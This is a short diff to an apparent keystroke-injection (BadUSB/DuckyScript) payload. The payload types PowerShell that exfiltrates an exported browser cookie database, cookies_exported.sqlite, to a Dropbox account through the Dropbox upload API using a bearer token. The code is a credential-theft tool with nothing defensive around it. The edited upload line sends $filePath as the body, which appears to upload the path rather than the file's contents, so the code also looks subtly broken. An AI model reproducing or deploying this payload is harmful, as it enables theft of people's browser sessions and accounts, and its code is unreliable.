@@ -41,15 +41,14 @@ STRING DROPBOX_ACCESS_TOKEN
 ENTER
 
 STRINGLN
-    $authHeader = @{Authorization = "Bearer $accessToken"}
-    $dropboxFilePath = "/cookies_exported.sqlite"
-
     $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+    
+    $dropboxFilePath = "/cookies_exported.sqlite"
 
     $headers = @{}
     $headers.Add("Authorization", "Bearer $accessToken")
     $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
     $headers.Add("Content-Type", "application/octet-stream")
 
-    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent; exit;
+    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $filePath; exit;
 END_STRINGLN
